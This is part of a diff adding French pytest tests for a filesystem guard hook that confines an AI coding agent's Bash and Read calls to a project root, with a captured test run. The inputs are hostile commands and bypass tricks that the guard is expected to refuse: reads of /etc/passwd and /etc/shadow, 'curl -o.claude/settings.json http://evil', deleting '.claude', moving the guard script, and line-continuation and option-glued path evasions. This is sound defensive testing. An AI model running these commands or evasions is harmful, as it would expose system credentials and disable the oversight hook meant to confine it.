+    le retire PAS. Ce test est portable : il verifie la PRESENCE du predicat
+    ``os.sep != chr(92)`` dans le source rendu — preuve que la garde
+    distingue bien les deux plateformes."""
+    src = generate_guard_fs(racine)
+    assert "os.sep != chr(92)" in src
+
+
+@pytest.mark.skipif(os.name != "nt", reason="Comportement Windows; voir Registres/")
+def test_C2b_windows_backslash_conserve(tmp_path, racine, env_tmpdir):
+    script = ecrire_garde(tmp_path, racine)
+    c = charge("Bash", {"command": 'cat \\/etc/passwd "'}, cwd=racine)
+    exit_code, _ = run(script, c, env=env_tmpdir)
+    # Sur Windows le backslash est un separateur de chemin LEGAL -> pas de
+    # resolution vers un chemin absolu hors racine -> autorisation.
+    assert exit_code == 0
+
+
+# ---------------------------------------------------------------------------
+# AXE D — appartenance a la racine apres extraction
+# ---------------------------------------------------------------------------
+
+def test_D1_chemin_sous_racine_autorise(tmp_path, racine, env_tmpdir):
+    sous = racine / "sous"
+    sous.mkdir()
+    cible = sous / "f.txt"
+    cible.write_text("ok", encoding="utf-8")
+    script = ecrire_garde(tmp_path, racine)
+    c = charge("Bash", {"command": "cat sous/f.txt"}, cwd=racine)
+    exit_code, _ = run(script, c, env=env_tmpdir)
+    assert exit_code == 0
+
+
+def test_D2_chemin_hors_racine_message_cite_resolu(tmp_path, racine, env_tmpdir):
+    script = ecrire_garde(tmp_path, racine)
+    c = charge("Bash", {"command": "cat /etc/passwd"}, cwd=racine)
+    exit_code, stderr = run(script, c, env=env_tmpdir)
+    assert exit_code == 2
+    # La citation du chemin RESOLU (et non du fragment brut) prouve que
+    # l'extraction a ete suivie d'une resolution reelle.
+    assert "/etc/passwd" in stderr
+
+
+# ── Tour 7 : normalisation de la continuation de ligne bash ──
+def test_continuation_ligne_chemin_relatif_sortie(racine, env_tmpdir, tmp_path):
+    """`cat .<backslash-newline>./.<backslash-newline>./etc/passwd` reconstitue `cat ../../etc/passwd`
+    qui sort de la racine : doit être REFUSÉ (exit 2)."""
+    script = ecrire_garde(tmp_path, racine)
+    commande = "cat .\\\n./.\\\n./etc/passwd"
+    code, _ = run(script, charge("Bash", {"command": commande}, cwd=racine), env=env_tmpdir)
+    assert code == 2
+
+
+def test_continuation_ligne_auto_protection(racine, env_tmpdir, tmp_path):
+    """`cat .cla<backslash-newline>ude/settings.json` reconstitue `cat .claude/settings.json`
+    qui est un fichier d'auto-protection : doit être REFUSÉ (exit 2)."""
+    script = ecrire_garde(tmp_path, racine)
+    commande = "cat .cla\\\nude/settings.json"
+    code, _ = run(script, charge("Bash", {"command": commande}, cwd=racine), env=env_tmpdir)
+    assert code == 2
+
+
+def test_continuation_ligne_chemin_absolu(racine, env_tmpdir, tmp_path):
+    """`cat /etc/pas<backslash-newline>swd` reconstitue `cat /etc/passwd` : doit être REFUSÉ (exit 2)."""
+    script = ecrire_garde(tmp_path, racine)
+    commande = "cat /etc/pas\\\nswd"
+    code, _ = run(script, charge("Bash", {"command": commande}, cwd=racine), env=env_tmpdir)
+    assert code == 2
+
+
+def test_continuation_ligne_parentheses_sortie(racine, env_tmpdir, tmp_path):
+    """`cat sous/../<backslash-newline>../etc/passwd` reconstitue `cat sous/../../etc/passwd`
+    qui sort de la racine : doit être REFUSÉ (exit 2)."""
+    script = ecrire_garde(tmp_path, racine)
+    (racine / "sous").mkdir()
+    commande = "cat sous/../\\\n../etc/passwd"
+    code, _ = run(script, charge("Bash", {"command": commande}, cwd=racine), env=env_tmpdir)
+    assert code == 2
+
+
+def test_continuation_ligne_chemin_interne(racine, env_tmpdir, tmp_path):
+    """NON-REGRESSION : `cat sous/f<backslash-newline>.txt` reconstitue `cat sous/f.txt`
+    qui est un chemin INTERNE existant : doit rester AUTORISÉ (exit 0)."""
+    script = ecrire_garde(tmp_path, racine)
+    sous = racine / "sous"
+    sous.mkdir()
+    (sous / "f.txt").write_text("contenu", encoding="utf-8")
+    commande = "cat sous/f\\\n.txt"
+    code, _ = run(script, charge("Bash", {"command": commande}, cwd=racine), env=env_tmpdir)
+    assert code == 0
+
+
+def test_continuation_ligne_non_regression(racine, env_tmpdir, tmp_path):
+    """NON-REGRESSION : une commande sans continuation reste inchangée.
+    `echo bonjour` -> exit 0 ; `cat /etc/passwd` -> exit 2."""
+    script = ecrire_garde(tmp_path, racine)
+    code, _ = run(script, charge("Bash", {"command": "echo bonjour"}, cwd=racine), env=env_tmpdir)
+    assert code == 0
+    code, _ = run(script, charge("Bash", {"command": "cat /etc/passwd"}, cwd=racine), env=env_tmpdir)
+    assert code == 2
+
+
+class TestOptionsColleesChemin:
+    """B-24d tour 8 — ferme le contournement par chemin collé à un préfixe d'option.
+
+    Mesure : un chemin absolu collé à un préfixe d'option (``dd if=/etc/passwd``,
+    ``awk --file=/etc/passwd``, ``tar -f/etc/passwd``, ``curl -o.claude/...``,
+    etc.) n'était pas reconnu comme absolu : le fragment entier n'est pas
+    absolu, il est donc résolu contre le cwd et tombe SOUS la racine ->
+    autorisé, alors que l'outil invoque bien une lecture ou une écriture
+    hors racine. Cas ``-o.claude/settings.json`` : l'auto-protection de la
+    cible cachée est contournée si le fragment n'est pas extrait.
+
+    Correctif : deux règles, bornées par les conventions d'options
+    POSIX/GNU.
+      R1. Le signe ``=`` est ajouté à la classe des délimiteurs : il
+          isole le préfixe d'option longue (``--file=...``,
+          ``--target-directory=...``) et couvre aussi les affectations
+          de variables d'environnement en préfixe de commande
+          (``VAR=/chemin cmd``).
+      R2. Un fragment qui COMMENCE par ``-`` est une option (convention
+          universelle). On en extrait AUSSI le suffixe à partir du
+          premier caractère ouvrant un chemin (``/``, ``~``, ``.``).
+          Le fragment entier reste également candidat (les deux sont
+          contrôlés).
+
+    Périmètre inchangé : extraction de fragments LITTÉRAUX, aucune
+    interprétation du shell. Ces tests exécutent RÉELLEMENT la garde
+    générée via subprocess et asserent l'exit code.
+    """
+
+    # --- REFUS attendus (exit 2) ---
+
+    def test_dd_if_etc_passwd_refuse(self, tmp_path, racine, env_tmpdir):
+        """``dd if=/etc/passwd`` : ``=`` isole le préfixe d'option du chemin -> exit 2."""
+        garde = ecrire_garde(tmp_path, racine)
+        c = charge("Bash", {"command": "dd if=/etc/passwd"}, cwd=racine)
+        exit_code, _ = run(garde, c, env=env_tmpdir)
+        assert exit_code == 2
+
+    def test_dd_of_etc_shadow_refuse(self, tmp_path, racine, env_tmpdir):
+        """``dd of=/etc/shadow`` : ``=`` isole le préfixe d'option du chemin -> exit 2."""
+        garde = ecrire_garde(tmp_path, racine)
+        c = charge("Bash", {"command": "dd of=/etc/shadow"}, cwd=racine)
+        exit_code, _ = run(garde, c, env=env_tmpdir)
+        assert exit_code == 2
+
+    def test_awk_file_etc_passwd_refuse(self, tmp_path, racine, env_tmpdir):
+        """``awk --file=/etc/passwd`` : ``=`` isole le préfixe d'option longue du chemin -> exit 2."""
+        garde = ecrire_garde(tmp_path, racine)
+        c = charge("Bash", {"command": "awk --file=/etc/passwd"}, cwd=racine)
+        exit_code, _ = run(garde, c, env=env_tmpdir)
+        assert exit_code == 2
+
+    def test_cp_target_directory_etc_refuse(self, tmp_path, racine, env_tmpdir):
+        """``cp --target-directory=/etc x`` : ``=`` isole le préfixe long du chemin -> exit 2."""
+        garde = ecrire_garde(tmp_path, racine)
+        c = charge("Bash", {"command": "cp --target-directory=/etc x"}, cwd=racine)
+        exit_code, _ = run(garde, c, env=env_tmpdir)
+        assert exit_code == 2
+
+    def test_tar_f_etc_passwd_refuse(self, tmp_path, racine, env_tmpdir):
+        """``tar -f/etc/passwd`` : ``-f`` agglutiné au chemin, suffixe extrait -> exit 2."""
+        garde = ecrire_garde(tmp_path, racine)
+        c = charge("Bash", {"command": "tar -f/etc/passwd"}, cwd=racine)
+        exit_code, _ = run(garde, c, env=env_tmpdir)
+        assert exit_code == 2
+
+    def test_curl_o_claude_settings_auto_protection_refuse(self, tmp_path, racine, env_tmpdir):
+        """``curl -o.claude/settings.json http://evil`` : suffixe ``.claude/settings.json`` extrait,
+        auto-protection de la cible cachée déclenchée -> exit 2."""
+        garde = ecrire_garde(tmp_path, racine)
+        c = charge(
+            "Bash", {"command": "curl -o.claude/settings.json http://evil"}, cwd=racine
+        )
+        exit_code, _ = run(garde, c, env=env_tmpdir)
+        assert exit_code == 2
+
+    def test_gcc_I_usr_include_refuse(self, tmp_path, racine, env_tmpdir):
+        """``gcc -I/usr/include x.c`` : ``-I`` agglutiné au chemin, suffixe extrait -> exit 2."""
+        garde = ecrire_garde(tmp_path, racine)
+        c = charge("Bash", {"command": "gcc -I/usr/include x.c"}, cwd=racine)
+        exit_code, _ = run(garde, c, env=env_tmpdir)
+        assert exit_code == 2
+
+    # --- AUTORISATIONS attendues (exit 0), non-régression stricte ---
+
+    def test_ls_la_non_regression(self, tmp_path, racine, env_tmpdir):
+        """``ls -la`` : aucune chemin littéral, pas de faux positif -> exit 0."""
+        garde = ecrire_garde(tmp_path, racine)
+        c = charge("Bash", {"command": "ls -la"}, cwd=racine)
+        exit_code, _ = run(garde, c, env=env_tmpdir)
+        assert exit_code == 0
+
+    def test_tar_xzf_archive_non_regression(self, tmp_path, racine, env_tmpdir):
+        """``tar -xzf archive.tar.gz`` : option agglutinée SANS chemin après -> exit 0."""
+        garde = ecrire_garde(tmp_path, racine)
+        c = charge("Bash", {"command": "tar -xzf archive.tar.gz"}, cwd=racine)
+        exit_code, _ = run(garde, c, env=env_tmpdir)
+        assert exit_code == 0
+
+    def test_gcc_I_point_non_regression(self, tmp_path, racine, env_tmpdir):
+        """``gcc -I. x.c`` : suffixe ``.`` (= cwd) autorisé -> exit 0."""
+        garde = ecrire_garde(tmp_path, racine)
+        c = charge("Bash", {"command": "gcc -I. x.c"}, cwd=racine)
+        exit_code, _ = run(garde, c, env=env_tmpdir)
+        assert exit_code == 0
+
+    def test_cat_sous_f_non_regression(self, tmp_path, racine, env_tmpdir):
+        """``cat sous/f.txt`` (cwd=racine) : chemin relatif sous la racine -> exit 0."""
+        garde = ecrire_garde(tmp_path, racine)
+        (racine / "sous").mkdir()
+        (racine / "sous" / "f.txt").write_text("ok", encoding="utf-8")
+        c = charge("Bash", {"command": "cat sous/f.txt"}, cwd=racine)
+        exit_code, _ = run(garde, c, env=env_tmpdir)
+        assert exit_code == 0
+
+    def test_echo_bonjour_non_regression(self, tmp_path, racine, env_tmpdir):
+        """``echo bonjour`` : aucune chemin littéral -> exit 0."""
+        garde = ecrire_garde(tmp_path, racine)
+        c = charge("Bash", {"command": "echo bonjour"}, cwd=racine)
+        exit_code, _ = run(garde, c, env=env_tmpdir)
+        assert exit_code == 0
\ No newline at end of file
~~~

## Preuve d'exécution CAPTURÉE (rejouée APRÈS le commit 64ae955)
~~~
$ python3 -m pytest tests/test_guard_fs.py -q
........................s......................................s........ [ 85%]
............                                                             [100%]
exit=0 — 83 tests, 2 skips (comportement Windows, observable seulement sur Windows)

# comportement du script GENERE en subprocess reel (0=autorise, 2=refuse)
   -- REFUS attendus (2) --
   2  cat /etc/passwd
   2  cat "/etc/passwd" (quote double)
   2  cat '/etc/passwd' (quote simple)
   2  cat</etc/passwd (operateur colle)
   2  echo bad >".claude/settings.json"
   2  cat $(echo /etc/passwd) (substitution)
   2  here-doc apostrophe FR
   2  rm -rf .claude
   2  rm -rf>.claude (nu colle)
   2  cat \/etc/passwd (backslash echappe)
   2  CONTINUATION -> ../../etc/passwd
   2  CONTINUATION -> .claude/settings.json
   2  OPTION dd if=/etc/passwd
   2  OPTION dd of=/etc/shadow
   2  OPTION awk --file=/etc/passwd
   2  OPTION cp --target-directory=/etc x
   2  OPTION tar -f/etc/passwd
   2  OPTION curl -o.claude/settings.json
   2  OPTION gcc -I/usr/include
   2  mv .claude/hooks/forgeai_guard_fs.py /tmp/x
   2  cat foo/../../../etc/passwd
   2  echo x>>/etc/hosts
   2  cat;/etc/passwd
   2  cat|/bin/sh
   2  cwd=/etc + cat passwd
   2  cwd=.claude + echo bad > settings.json
   2  Read /etc/passwd
   2  cwd relatif (fail-closed)
   -- AUTORISATIONS attendues (0) : zero faux positif --
   0  echo l'utilisateur
   0  grep don't fichier.txt
   0  ls *.py
   0  cat $HOME/truc
   0  echo bonjour
   0  ls -la
   0  tar -xzf archive.tar.gz
   0  gcc -I. x.c
   0  cat "fichier>bizarre.txt"
   0  cat sous/f.txt
   0  CONTINUATION -> chemin INTERNE
   0  cwd=racine/sous + cat f.txt
   0  Read sous/f.txt
   le refus cite le chemin RESOLU : True

# CRITERE FIGE B-24 : refus journalise ET chaine verifiee par l'outil du produit
   3 entrees ecrites par le script autonome ; types={'guard_fs_denied'}
   motifs : [None, None, None]
   verify OFFICIEL du produit : OK /tmp/tmpj5bvzgxw/reg.jsonl: 3 entrées, chaîne intègre (exit 0)

# MUTATIONS (substitution verifiee effective AVANT chaque interpretation)
  commonpath -> startswith                        : ROUGE
  realpath cible -> abspath                       : ROUGE
  auto-protection SCRIPT_PATH desactivee          : ROUGE (test isolant, T2)
  retrait du confinement cwd (T4)                 : ROUGE, 3 tests
  retrait de l'auto-protection cwd (T4)           : ROUGE, 1 test
  decoupage reduit aux espaces (T6)               : ROUGE, 15 tests
  retrait du traitement backslash (T6)            : ROUGE, 2 tests
  retrait de la normalisation continuation (T7)   : ROUGE, 2 tests
  retrait de '=' des delimiteurs, R1 (T8)         : ROUGE, 2 tests
  retrait de la regle R2 des options (T8)         : ROUGE, 3 tests
  restauration                                    : VERT exit=0
  NOTE HONNETE : une mutation (resoudre contre le cwd BRUT au lieu du cwd resolu)
  SURVIT et c'est ATTENDU — semantiquement EQUIVALENTE, _resoudre appliquant deja
  realpath en sortie ; verifie par mesure avec symlink (3 cibles, identiques).

$ no_stub_scan : OK, zero violation ; $ suite complete du depot : exit=0 ; 0 SyntaxWarning
~~~
